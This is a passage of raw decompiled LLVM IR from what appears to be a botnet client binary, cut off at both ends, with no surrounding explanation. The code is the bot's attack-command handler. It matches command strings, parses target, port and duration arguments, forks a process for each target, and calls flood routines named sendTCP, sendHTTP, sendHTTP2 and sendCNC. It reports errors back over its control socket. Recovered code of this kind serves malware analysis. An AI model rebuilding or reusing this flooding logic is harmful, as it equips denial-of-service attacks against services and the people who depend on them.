  %v2_804fa46 = load i32, i32* %v1_804fa46, align 4
  %v1_804fa4b = call i32 @atol(i32 %v2_804fa46)
  br label %dec_label_pc_804fa62

dec_label_pc_804fa62:                             ; preds = %dec_label_pc_804f9eb, %dec_label_pc_804fa40
  %storemerge7 = phi i32 [ %v1_804fa4b, %dec_label_pc_804fa40 ], [ 10, %dec_label_pc_804f9eb ]
  store i32 %storemerge7, i32* @esi, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  br i1 %v7_804f9a1, label %dec_label_pc_804fa71, label %dec_label_pc_804fa93

dec_label_pc_804fa71:                             ; preds = %dec_label_pc_804fa62
  %v1_804fa74 = add i32 %tmp164, 24
  %v5_804fa74 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804fa74, i1* %cf.global-to-local, align 1
  %v1_804fa77 = inttoptr i32 %v1_804fa74 to i32*
  %v2_804fa77 = load i32, i32* %v1_804fa77, align 4
  %v1_804fa7c = call i32 @atol(i32 %v2_804fa77)
  br label %dec_label_pc_804fa93

dec_label_pc_804fa93:                             ; preds = %dec_label_pc_804fa62, %dec_label_pc_804fa71
  %storemerge6 = phi i32 [ %v1_804fa7c, %dec_label_pc_804fa71 ], [ 0, %dec_label_pc_804fa62 ]
  store i32 %storemerge6, i32* @edi, align 4
  %v2_804faaa = inttoptr i32 %v2_804f9f1 to i8*
  %v3_804faaa = call i32 @__GI_strchr(i8* %v2_804faaa, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804faaf = icmp eq i32 %v3_804faaa, 0
  br i1 %v1_804faaf, label %dec_label_pc_804fb38, label %dec_label_pc_804fab7

dec_label_pc_804fab7:                             ; preds = %dec_label_pc_804fa93
  store i32 %v2_804f9f1, i32* @eax, align 4
  %v2_804fac5 = call i32 @__GI_strtok(i32 %v2_804f9f1, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb3046 = icmp eq i32 %v2_804fac5, 0
  %v1_804fb3453 = icmp eq i1 %v4_804fb3046, false
  br i1 %v1_804fb3453, label %dec_label_pc_804facf, label %dec_label_pc_804fb82

dec_label_pc_804facf:                             ; preds = %dec_label_pc_804fab7, %dec_label_pc_804fb19
  %storemerge1254 = phi i32 [ %v2_804fb28, %dec_label_pc_804fb19 ], [ %v2_804fac5, %dec_label_pc_804fab7 ]
  %v0_804facf = call i32 @listFork()
  store i32 %v0_804facf, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fad4 = icmp eq i32 %v0_804facf, 0
  %v1_804fad6 = icmp eq i1 %v1_804fad4, false
  br i1 %v1_804fad6, label %dec_label_pc_804fb19, label %dec_label_pc_804fad8

dec_label_pc_804fad8:                             ; preds = %dec_label_pc_804facf
  %v7_804fb08 = inttoptr i32 %v2_804fa35 to i8*
  %v8_804fb08 = call i32 @sendTCP(i32 %storemerge1254, i32 %v1_804fa01, i32 %v1_804fa14, i32 %v1_804fa27, i8* %v7_804fb08, i32 %storemerge6, i32 %storemerge7)
  %v1_804fb14 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fb19:                             ; preds = %dec_label_pc_804facf
  %v2_804fb28 = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fb30 = icmp eq i32 %v2_804fb28, 0
  %v1_804fb34 = icmp eq i1 %v4_804fb30, false
  br i1 %v1_804fb34, label %dec_label_pc_804facf, label %dec_label_pc_804fb82

dec_label_pc_804fb38:                             ; preds = %dec_label_pc_804fa93
  %v0_804fb38 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fb3d = icmp eq i32 %v0_804fb38, 0
  %v1_804fb3f = icmp eq i1 %v1_804fb3d, false
  br i1 %v1_804fb3f, label %dec_label_pc_804fb82, label %dec_label_pc_804fb41

dec_label_pc_804fb41:                             ; preds = %dec_label_pc_804fb38
  %v7_804fb71 = inttoptr i32 %v2_804fa35 to i8*
  %v8_804fb71 = call i32 @sendTCP(i32 %v2_804f9f1, i32 %v1_804fa01, i32 %v1_804fa14, i32 %v1_804fa27, i8* %v7_804fb71, i32 %storemerge6, i32 %storemerge7)
  %v1_804fb7d = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fb82:                             ; preds = %dec_label_pc_804fb19, %dec_label_pc_804fab7, %dec_label_pc_804fb38, %dec_label_pc_804f8f4
  %v2_804fb85 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fba2 = inttoptr i32 %v2_804fb85 to i8*
  store i32 %v2_804fb85, i32* @esi, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_8059aee.432 to i32), i32* @edi, align 4
  %v7_804fbb4 = call i32 @_strncmp(i8* %v4_804fba2, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @global_var_8059aee.432, i32 0, i32 0), i32 5)
  %v8_804fbb4 = urem i32 %v7_804fbb4, 2
  %v9_804fbb4 = icmp eq i32 %v8_804fbb4, 0
  %v0_804fbb6 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fbb6 = or i1 %v0_804fbb6, %v9_804fbb4
  %v3_804fbb6 = zext i1 %v2_804fbb6 to i32
  %v4_804fbb6 = load i32, i32* @edx, align 4
  %v5_804fbb6 = and i32 %v4_804fbb6, -256
  %v6_804fbb6 = or i32 %v3_804fbb6, %v5_804fbb6
  %v7_804fbb6 = xor i32 %v6_804fbb6, 1
  store i32 %v7_804fbb6, i32* @edx, align 4
  %v3_804fbbc = and i32 %v7_804fbb4, -256
  %v1_804fbbe = trunc i32 %v7_804fbb6 to i8
  %v3_804fbbe = zext i1 %v0_804fbb6 to i8
  %v4_804fbbe = sub nsw i8 %v1_804fbbe, %v3_804fbbe
  %v15_804fbbe = icmp eq i8 %v4_804fbbe, 0
  %v20_804fbbe = zext i8 %v4_804fbbe to i32
  %v23_804fbbe = or i32 %v20_804fbbe, %v3_804fbbc
  store i32 %v23_804fbbe, i32* @ecx, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fbc7 = icmp eq i1 %v15_804fbbe, false
  br i1 %v1_804fbc7, label %dec_label_pc_804fd4d, label %dec_label_pc_804fbcd

dec_label_pc_804fbcd:                             ; preds = %dec_label_pc_804fb82
  %v2_804fbc2 = sext i8 %v4_804fbbe to i32
  %v9_804fbcd = icmp ult i32 %arg1, 5
  store i1 %v9_804fbcd, i1* %cf.global-to-local, align 1
  %v7_804fbd1 = icmp sgt i32 %arg1, 5
  br i1 %v7_804fbd1, label %dec_label_pc_804fbd7, label %dec_label_pc_80502ec

dec_label_pc_804fbd7:                             ; preds = %dec_label_pc_804fbcd
  %v1_804fbda = add i32 %tmp164, 4
  %v5_804fbda = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804fbda, i1* %cf.global-to-local, align 1
  %v1_804fbdd = inttoptr i32 %v1_804fbda to i32*
  %v2_804fbdd = load i32, i32* %v1_804fbdd, align 4
  %v2_804fbea = inttoptr i32 %v2_804fbdd to i8*
  %v3_804fbea = call i32 @__GI_strchr(i8* %v2_804fbea, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fbef = icmp eq i32 %v3_804fbea, 0
  br i1 %v1_804fbef, label %dec_label_pc_804fcc3, label %dec_label_pc_804fbf7

dec_label_pc_804fbf7:                             ; preds = %dec_label_pc_804fbd7
  store i1 %v5_804fbda, i1* %cf.global-to-local, align 1
  %v2_804fbfd = load i32, i32* %v1_804fbdd, align 4
  store i32 %v2_804fbfd, i32* @eax, align 4
  %v2_804fc0a = call i32 @__GI_strtok(i32 %v2_804fbfd, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fcb438 = icmp eq i32 %v2_804fc0a, 0
  %v1_804fcb845 = icmp eq i1 %v4_804fcb438, false
  br i1 %v1_804fcb845, label %dec_label_pc_804fc17, label %dec_label_pc_804fd4d

dec_label_pc_804fc17:                             ; preds = %dec_label_pc_804fbf7, %dec_label_pc_804fc9d
  %v0_804fc17 = call i32 @listFork()
  store i32 %v0_804fc17, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fc1c = icmp eq i32 %v0_804fc17, 0
  %v1_804fc1e = icmp eq i1 %v1_804fc1c, false
  br i1 %v1_804fc1e, label %dec_label_pc_804fc9d, label %dec_label_pc_804fc20

dec_label_pc_804fc20:                             ; preds = %dec_label_pc_804fc17
  %v1_804fc23 = add i32 %tmp164, 24
  %v5_804fc23 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804fc23, i1* %cf.global-to-local, align 1
  %v1_804fc26 = inttoptr i32 %v1_804fc23 to i32*
  %v2_804fc26 = load i32, i32* %v1_804fc26, align 4
  %v1_804fc2b = call i32 @atol(i32 %v2_804fc26)
  store i32 %v1_804fc2b, i32* @ebx, align 4
  %v1_804fc35 = add i32 %tmp164, 20
  %v5_804fc35 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804fc35, i1* %cf.global-to-local, align 1
  %v1_804fc38 = inttoptr i32 %v1_804fc35 to i32*
  %v2_804fc38 = load i32, i32* %v1_804fc38, align 4
  %v1_804fc3d = call i32 @atol(i32 %v2_804fc38)
  store i32 %v1_804fc3d, i32* @esi, align 4
  %v1_804fc47 = add i32 %tmp164, 16
  %v1_804fc4a = inttoptr i32 %v1_804fc47 to i32*
  %v2_804fc4a = load i32, i32* %v1_804fc4a, align 4
  store i32 %v2_804fc4a, i32* @edi, align 4
  %v1_804fc51 = add i32 %tmp164, 12
  %v5_804fc51 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804fc51, i1* %cf.global-to-local, align 1
  %v1_804fc54 = inttoptr i32 %v1_804fc51 to i32*
  %v2_804fc54 = load i32, i32* %v1_804fc54, align 4
  %v1_804fc59 = call i32 @atol(i32 %v2_804fc54)
  %v1_804fc5e = urem i32 %v1_804fc59, 65536
  store i32 %v1_804fc5e, i32* %edx.global-to-local, align 4
  %v1_804fc66 = add i32 %tmp164, 8
  %v1_804fc69 = inttoptr i32 %v1_804fc66 to i32*
  %v2_804fc69 = load i32, i32* %v1_804fc69, align 4
  store i1 %v5_804fbda, i1* %cf.global-to-local, align 1
  %v2_804fc73 = load i32, i32* %v1_804fbdd, align 4
  %v0_804fc75 = load i32, i32* @ebx, align 4
  %v0_804fc79 = load i32, i32* @esi, align 4
  %v0_804fc7d = load i32, i32* @edi, align 4
  %v6_804fc8c = trunc i32 %v1_804fc59 to i16
  %v7_804fc8c = call i32 @sendHTTP(i32 %v2_804fc73, i32 %v2_804fc69, i16 %v6_804fc8c, i32 %v0_804fc7d, i32 %v0_804fc79, i32 %v0_804fc75)
  %v1_804fc98 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fc9d:                             ; preds = %dec_label_pc_804fc17
  %v2_804fcac = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804fcb4 = icmp eq i32 %v2_804fcac, 0
  %v1_804fcb8 = icmp eq i1 %v4_804fcb4, false
  br i1 %v1_804fcb8, label %dec_label_pc_804fc17, label %dec_label_pc_804fd4d

dec_label_pc_804fcc3:                             ; preds = %dec_label_pc_804fbd7
  %v0_804fcc3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fcc8 = icmp eq i32 %v0_804fcc3, 0
  %v1_804fcca = icmp eq i1 %v1_804fcc8, false
  br i1 %v1_804fcca, label %dec_label_pc_80502ec, label %dec_label_pc_804fcd0

dec_label_pc_804fcd0:                             ; preds = %dec_label_pc_804fcc3
  %v1_804fcd3 = add i32 %tmp164, 24
  %v5_804fcd3 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804fcd3, i1* %cf.global-to-local, align 1
  %v1_804fcd6 = inttoptr i32 %v1_804fcd3 to i32*
  %v2_804fcd6 = load i32, i32* %v1_804fcd6, align 4
  %v1_804fcdb = call i32 @atol(i32 %v2_804fcd6)
  store i32 %v1_804fcdb, i32* @ebx, align 4
  %v1_804fce5 = add i32 %tmp164, 20
  %v5_804fce5 = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804fce5, i1* %cf.global-to-local, align 1
  %v1_804fce8 = inttoptr i32 %v1_804fce5 to i32*
  %v2_804fce8 = load i32, i32* %v1_804fce8, align 4
  %v1_804fced = call i32 @atol(i32 %v2_804fce8)
  store i32 %v1_804fced, i32* @esi, align 4
  %v1_804fcf7 = add i32 %tmp164, 16
  %v1_804fcfa = inttoptr i32 %v1_804fcf7 to i32*
  %v2_804fcfa = load i32, i32* %v1_804fcfa, align 4
  store i32 %v2_804fcfa, i32* @edi, align 4
  %v1_804fd01 = add i32 %tmp164, 12
  %v5_804fd01 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804fd01, i1* %cf.global-to-local, align 1
  %v1_804fd04 = inttoptr i32 %v1_804fd01 to i32*
  %v2_804fd04 = load i32, i32* %v1_804fd04, align 4
  %v1_804fd09 = call i32 @atol(i32 %v2_804fd04)
  %v1_804fd0e = urem i32 %v1_804fd09, 65536
  store i32 %v1_804fd0e, i32* %edx.global-to-local, align 4
  %v1_804fd16 = add i32 %tmp164, 8
  %v1_804fd19 = inttoptr i32 %v1_804fd16 to i32*
  %v2_804fd19 = load i32, i32* %v1_804fd19, align 4
  store i1 %v5_804fbda, i1* %cf.global-to-local, align 1
  %v2_804fd23 = load i32, i32* %v1_804fbdd, align 4
  %v0_804fd25 = load i32, i32* @ebx, align 4
  %v0_804fd29 = load i32, i32* @esi, align 4
  %v0_804fd2d = load i32, i32* @edi, align 4
  %v6_804fd3c = trunc i32 %v1_804fd09 to i16
  %v7_804fd3c = call i32 @sendHTTP(i32 %v2_804fd23, i32 %v2_804fd19, i16 %v6_804fd3c, i32 %v0_804fd2d, i32 %v0_804fd29, i32 %v0_804fd25)
  %v1_804fd48 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804fd4d:                             ; preds = %dec_label_pc_804fc9d, %dec_label_pc_804fbf7, %dec_label_pc_804fb82
  %v2_804fd50 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fd6d = inttoptr i32 %v2_804fd50 to i8*
  store i32 %v2_804fd50, i32* @esi, align 4
  store i32 ptrtoint ([10 x i8]* @global_var_8059af3.433 to i32), i32* @edi, align 4
  %v7_804fd7f = call i32 @_strncmp(i8* %v4_804fd6d, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @global_var_8059af3.433, i32 0, i32 0), i32 10)
  %v8_804fd7f = urem i32 %v7_804fd7f, 2
  %v9_804fd7f = icmp eq i32 %v8_804fd7f, 0
  %v0_804fd81 = load i1, i1* %cf.global-to-local, align 1
  %v2_804fd81 = or i1 %v0_804fd81, %v9_804fd7f
  %v3_804fd81 = zext i1 %v2_804fd81 to i32
  %v4_804fd81 = load i32, i32* @edx, align 4
  %v5_804fd81 = and i32 %v4_804fd81, -256
  %v6_804fd81 = or i32 %v3_804fd81, %v5_804fd81
  %v7_804fd81 = xor i32 %v6_804fd81, 1
  store i32 %v7_804fd81, i32* @edx, align 4
  %v1_804fd89 = trunc i32 %v7_804fd81 to i8
  %v3_804fd89 = zext i1 %v0_804fd81 to i8
  %v4_804fd89 = sub nsw i8 %v1_804fd89, %v3_804fd89
  %v15_804fd89 = icmp eq i8 %v4_804fd89, 0
  store i1 false, i1* @cf, align 1
  %v1_804fd92 = icmp eq i1 %v15_804fd89, false
  br i1 %v1_804fd92, label %dec_label_pc_804fe5d, label %dec_label_pc_804fd98

dec_label_pc_804fd98:                             ; preds = %dec_label_pc_804fd4d
  %v2_804fd8d = sext i8 %v4_804fd89 to i32
  %v9_804fd98 = icmp ult i32 %arg1, 5
  store i1 %v9_804fd98, i1* %cf.global-to-local, align 1
  %v7_804fd9c = icmp sgt i32 %arg1, 5
  br i1 %v7_804fd9c, label %dec_label_pc_804fda2, label %dec_label_pc_80502ec

dec_label_pc_804fda2:                             ; preds = %dec_label_pc_804fd98
  %v1_804fda5 = add i32 %tmp164, 12
  %v5_804fda5 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804fda5, i1* %cf.global-to-local, align 1
  %v1_804fda8 = inttoptr i32 %v1_804fda5 to i32*
  %v2_804fda8 = load i32, i32* %v1_804fda8, align 4
  %v1_804fdad = call i32 @atol(i32 %v2_804fda8)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp175 = icmp slt i32 %v1_804fdad, 1
  br i1 %tmp175, label %dec_label_pc_80502ec, label %dec_label_pc_804fdba

dec_label_pc_804fdba:                             ; preds = %dec_label_pc_804fda2
  %v1_804fdbd = add i32 %tmp164, 20
  %v5_804fdbd = icmp ugt i32* %arg2, inttoptr (i32 -21 to i32*)
  store i1 %v5_804fdbd, i1* %cf.global-to-local, align 1
  %v1_804fdc0 = inttoptr i32 %v1_804fdbd to i32*
  %v2_804fdc0 = load i32, i32* %v1_804fdc0, align 4
  %v1_804fdc5 = call i32 @atol(i32 %v2_804fdc0)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp176 = icmp slt i32 %v1_804fdc5, 1
  %tmp177 = icmp eq i1 %tmp176, false
  br i1 %tmp177, label %dec_label_pc_804fdd3, label %dec_label_pc_80502ec

dec_label_pc_804fdd3:                             ; preds = %dec_label_pc_804fdba
  %v0_804fdd3 = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fdd8 = icmp eq i32 %v0_804fdd3, 0
  %v1_804fdda = icmp eq i1 %v1_804fdd8, false
  br i1 %v1_804fdda, label %dec_label_pc_80502ec, label %dec_label_pc_804fde0

dec_label_pc_804fde0:                             ; preds = %dec_label_pc_804fdd3
  %v1_804fde3 = add i32 %tmp164, 24
  %v5_804fde3 = icmp ugt i32* %arg2, inttoptr (i32 -25 to i32*)
  store i1 %v5_804fde3, i1* %cf.global-to-local, align 1
  %v1_804fde6 = inttoptr i32 %v1_804fde3 to i32*
  %v2_804fde6 = load i32, i32* %v1_804fde6, align 4
  %v1_804fdeb = call i32 @atol(i32 %v2_804fde6)
  store i32 %v1_804fdeb, i32* @ebx, align 4
  store i1 %v5_804fdbd, i1* %cf.global-to-local, align 1
  %v2_804fdf8 = load i32, i32* %v1_804fdc0, align 4
  %v1_804fdfd = call i32 @atol(i32 %v2_804fdf8)
  store i32 %v1_804fdfd, i32* @esi, align 4
  %v1_804fe07 = add i32 %tmp164, 16
  %v1_804fe0a = inttoptr i32 %v1_804fe07 to i32*
  %v2_804fe0a = load i32, i32* %v1_804fe0a, align 4
  store i32 %v2_804fe0a, i32* @edi, align 4
  store i1 %v5_804fda5, i1* %cf.global-to-local, align 1
  %v2_804fe14 = load i32, i32* %v1_804fda8, align 4
  %v1_804fe19 = call i32 @atol(i32 %v2_804fe14)
  %v1_804fe1e = urem i32 %v1_804fe19, 65536
  store i32 %v1_804fe1e, i32* %edx.global-to-local, align 4
  %v1_804fe26 = add i32 %tmp164, 8
  %v1_804fe29 = inttoptr i32 %v1_804fe26 to i32*
  %v2_804fe29 = load i32, i32* %v1_804fe29, align 4
  %v1_804fe30 = add i32 %tmp164, 4
  %v5_804fe30 = icmp ugt i32* %arg2, inttoptr (i32 -5 to i32*)
  store i1 %v5_804fe30, i1* %cf.global-to-local, align 1
  %v1_804fe33 = inttoptr i32 %v1_804fe30 to i32*
  %v2_804fe33 = load i32, i32* %v1_804fe33, align 4
  %v0_804fe35 = load i32, i32* @ebx, align 4
  %v0_804fe39 = load i32, i32* @esi, align 4
  %v0_804fe3d = load i32, i32* @edi, align 4
  %v6_804fe4c = trunc i32 %v1_804fe19 to i16
  %v7_804fe4c = call i32 @sendHTTP2(i32 %v2_804fe33, i32 %v2_804fe29, i16 %v6_804fe4c, i32 %v0_804fe3d, i32 %v0_804fe39, i32 %v0_804fe35)
  store i32 %v7_804fe4c, i32* @eax, align 4
  %v1_804fe58 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_804fe5d

dec_label_pc_804fe5d:                             ; preds = %dec_label_pc_804fd4d, %dec_label_pc_804fde0
  %v2_804fe60 = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fe7d = inttoptr i32 %v2_804fe60 to i8*
  store i32 %v2_804fe60, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059afd.434 to i32), i32* @edi, align 4
  %v7_804fe8f = call i32 @_strncmp(i8* %v4_804fe7d, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059afd.434, i32 0, i32 0), i32 4)
  %v8_804fe8f = urem i32 %v7_804fe8f, 2
  %v9_804fe8f = icmp eq i32 %v8_804fe8f, 0
  %v0_804fe91 = load i1, i1* @cf, align 1
  %v2_804fe91 = or i1 %v0_804fe91, %v9_804fe8f
  %v3_804fe91 = zext i1 %v2_804fe91 to i32
  %v4_804fe91 = load i32, i32* @edx, align 4
  %v5_804fe91 = and i32 %v4_804fe91, -256
  %v6_804fe91 = or i32 %v3_804fe91, %v5_804fe91
  %v7_804fe91 = xor i32 %v6_804fe91, 1
  store i32 %v7_804fe91, i32* @edx, align 4
  %v1_804fe99 = trunc i32 %v7_804fe91 to i8
  %v3_804fe99 = zext i1 %v0_804fe91 to i8
  %v15_804fe99 = icmp eq i8 %v1_804fe99, %v3_804fe99
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804fea2 = icmp eq i1 %v15_804fe99, false
  br i1 %v1_804fea2, label %dec_label_pc_804ffdc, label %dec_label_pc_804fea8

dec_label_pc_804fea8:                             ; preds = %dec_label_pc_804fe5d
  %v9_804fea8 = icmp ult i32 %arg1, 3
  store i1 %v9_804fea8, i1* %cf.global-to-local, align 1
  %v7_804feac = icmp sgt i32 %arg1, 3
  br i1 %v7_804feac, label %dec_label_pc_804feae, label %dec_label_pc_804fed6

dec_label_pc_804feae:                             ; preds = %dec_label_pc_804fea8
  %v1_804feb1 = add i32 %tmp164, 8
  %v5_804feb1 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_804feb1, i1* %cf.global-to-local, align 1
  %v1_804feb4 = inttoptr i32 %v1_804feb1 to i32*
  %v2_804feb4 = load i32, i32* %v1_804feb4, align 4
  %v1_804feb9 = call i32 @atol(i32 %v2_804feb4)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp178 = icmp slt i32 %v1_804feb9, 1
  br i1 %tmp178, label %dec_label_pc_804fed6, label %dec_label_pc_804fec2

dec_label_pc_804fec2:                             ; preds = %dec_label_pc_804feae
  %v1_804fec5 = add i32 %tmp164, 12
  %v5_804fec5 = icmp ugt i32* %arg2, inttoptr (i32 -13 to i32*)
  store i1 %v5_804fec5, i1* %cf.global-to-local, align 1
  %v1_804fec8 = inttoptr i32 %v1_804fec5 to i32*
  %v2_804fec8 = load i32, i32* %v1_804fec8, align 4
  %v1_804fecd = call i32 @atol(i32 %v2_804fec8)
  store i1 false, i1* %cf.global-to-local, align 1
  %tmp179 = icmp slt i32 %v1_804fecd, 1
  %tmp180 = icmp eq i1 %tmp179, false
  br i1 %tmp180, label %dec_label_pc_804fef0, label %dec_label_pc_804fed6

dec_label_pc_804fed6:                             ; preds = %dec_label_pc_804fea8, %dec_label_pc_804fec2, %dec_label_pc_804feae
  %v0_804fed6 = load i32, i32* @global_var_805c520.20, align 32
  %v2_804fee6 = call i32 @sockprintf(i32 %v0_804fed6, i32 ptrtoint ([27 x i8]* @global_var_8059b01.435 to i32))
  br label %dec_label_pc_80502ec

dec_label_pc_804fef0:                             ; preds = %dec_label_pc_804fec2
  %v1_804fef3 = add i32 %tmp164, 4
  %v1_804fef6 = inttoptr i32 %v1_804fef3 to i32*
  %v2_804fef6 = load i32, i32* %v1_804fef6, align 4
  store i1 %v5_804feb1, i1* %cf.global-to-local, align 1
  %v2_804ff01 = load i32, i32* %v1_804feb4, align 4
  %v1_804ff06 = call i32 @atol(i32 %v2_804ff01)
  store i1 %v5_804fec5, i1* %cf.global-to-local, align 1
  %v2_804ff14 = load i32, i32* %v1_804fec8, align 4
  %v1_804ff19 = call i32 @atol(i32 %v2_804ff14)
  %v2_804ff2f = inttoptr i32 %v2_804fef6 to i8*
  %v3_804ff2f = call i32 @__GI_strchr(i8* %v2_804ff2f, i32 44)
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff34 = icmp eq i32 %v3_804ff2f, 0
  br i1 %v1_804ff34, label %dec_label_pc_804ffaa, label %dec_label_pc_804ff38

dec_label_pc_804ff38:                             ; preds = %dec_label_pc_804fef0
  store i32 %v2_804fef6, i32* @eax, align 4
  %v2_804ff46 = call i32 @__GI_strtok(i32 %v2_804fef6, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ffa229 = icmp eq i32 %v2_804ff46, 0
  %v1_804ffa636 = icmp eq i1 %v4_804ffa229, false
  br i1 %v1_804ffa636, label %dec_label_pc_804ff50, label %dec_label_pc_804ffdc

dec_label_pc_804ff50:                             ; preds = %dec_label_pc_804ff38, %dec_label_pc_804ff8b
  %storemerge1437 = phi i32 [ %v2_804ff9a, %dec_label_pc_804ff8b ], [ %v2_804ff46, %dec_label_pc_804ff38 ]
  %v0_804ff50 = call i32 @listFork()
  store i32 %v0_804ff50, i32* @eax, align 4
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ff55 = icmp eq i32 %v0_804ff50, 0
  %v1_804ff57 = icmp eq i1 %v1_804ff55, false
  br i1 %v1_804ff57, label %dec_label_pc_804ff8b, label %dec_label_pc_804ff59

dec_label_pc_804ff59:                             ; preds = %dec_label_pc_804ff50
  %v3_804ff6d = call i32 @sendCNC(i32 %storemerge1437, i32 %v1_804ff06, i32 %v1_804ff19)
  %v0_804ff72 = load i32, i32* @global_var_805c520.20, align 32
  %v1_804ff7a = call i32 @__libc_close(i32 %v0_804ff72)
  %v1_804ff86 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ff8b:                             ; preds = %dec_label_pc_804ff50
  %v2_804ff9a = call i32 @__GI_strtok(i32 0, i32 ptrtoint (i32* @global_var_8059611.306 to i32))
  store i1 false, i1* %cf.global-to-local, align 1
  %v4_804ffa2 = icmp eq i32 %v2_804ff9a, 0
  %v1_804ffa6 = icmp eq i1 %v4_804ffa2, false
  br i1 %v1_804ffa6, label %dec_label_pc_804ff50, label %dec_label_pc_804ffdc

dec_label_pc_804ffaa:                             ; preds = %dec_label_pc_804fef0
  %v0_804ffaa = call i32 @listFork()
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_804ffaf = icmp eq i32 %v0_804ffaa, 0
  %v1_804ffb1 = icmp eq i1 %v1_804ffaf, false
  br i1 %v1_804ffb1, label %dec_label_pc_80502ec, label %dec_label_pc_804ffb7

dec_label_pc_804ffb7:                             ; preds = %dec_label_pc_804ffaa
  %v3_804ffcb = call i32 @sendCNC(i32 %v2_804fef6, i32 %v1_804ff06, i32 %v1_804ff19)
  %v1_804ffd7 = call i32 @__GI__exit(i32 0)
  unreachable

dec_label_pc_804ffdc:                             ; preds = %dec_label_pc_804ff8b, %dec_label_pc_804ff38, %dec_label_pc_804fe5d
  %v2_804ffdf = load i32, i32* %arg2, align 4
  store i1 false, i1* @df, align 1
  %v4_804fffc = inttoptr i32 %v2_804ffdf to i8*
  store i32 %v2_804ffdf, i32* @esi, align 4
  store i32 ptrtoint ([4 x i8]* @global_var_8059b1c.436 to i32), i32* @edi, align 4
  %v7_805000e = call i32 @_strncmp(i8* %v4_804fffc, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @global_var_8059b1c.436, i32 0, i32 0), i32 4)
  %v8_805000e = urem i32 %v7_805000e, 2
  %v9_805000e = icmp eq i32 %v8_805000e, 0
  %v0_8050010 = load i1, i1* %cf.global-to-local, align 1
  %v2_8050010 = or i1 %v0_8050010, %v9_805000e
  %v3_8050010 = zext i1 %v2_8050010 to i32
  %v4_8050010 = load i32, i32* @edx, align 4
  %v5_8050010 = and i32 %v4_8050010, -256
  %v6_8050010 = or i32 %v3_8050010, %v5_8050010
  %v7_8050010 = xor i32 %v6_8050010, 1
  store i32 %v7_8050010, i32* @edx, align 4
  %v1_8050018 = trunc i32 %v7_8050010 to i8
  %v3_8050018 = zext i1 %v0_8050010 to i8
  %v15_8050018 = icmp eq i8 %v1_8050018, %v3_8050018
  store i1 false, i1* %cf.global-to-local, align 1
  %v1_8050021 = icmp eq i1 %v15_8050018, false
  br i1 %v1_8050021, label %dec_label_pc_805014e, label %dec_label_pc_8050027

dec_label_pc_8050027:                             ; preds = %dec_label_pc_804ffdc
  %v9_8050027 = icmp ult i32 %arg1, 3
  store i1 %v9_8050027, i1* %cf.global-to-local, align 1
  %v7_805002b = icmp sgt i32 %arg1, 3
  br i1 %v7_805002b, label %dec_label_pc_805002d, label %dec_label_pc_8050055

dec_label_pc_805002d:                             ; preds = %dec_label_pc_8050027
  %v1_8050030 = add i32 %tmp164, 8
  %v5_8050030 = icmp ugt i32* %arg2, inttoptr (i32 -9 to i32*)
  store i1 %v5_8050030, i1* %cf.global-to-local, align 1
  %v1_8050033 = inttoptr i32 %v1_8050030 to i32*
  %v2_8050033 = load i32, i32* %v1_8050033, align 4
  %v1_8050038 = call i32 @atol(i32 %v2_8050033)
  store i1 false, i1* %cf.global-to-local, align 1
